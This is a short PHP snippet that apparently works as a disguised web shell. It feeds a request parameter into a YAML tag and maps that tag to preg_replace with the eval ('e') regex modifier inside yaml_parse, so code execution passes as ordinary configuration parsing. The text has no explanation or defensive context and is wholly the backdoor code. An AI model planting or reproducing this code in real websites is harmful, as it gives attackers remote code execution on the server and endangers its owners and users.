<?php
  $str = urlencode($_REQUEST['op']);
  $yaml = <<<EOD
  greeting: !{$str} "|.+|e"
  EOD;
  $parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['op']}" => 'preg_replace'));
?>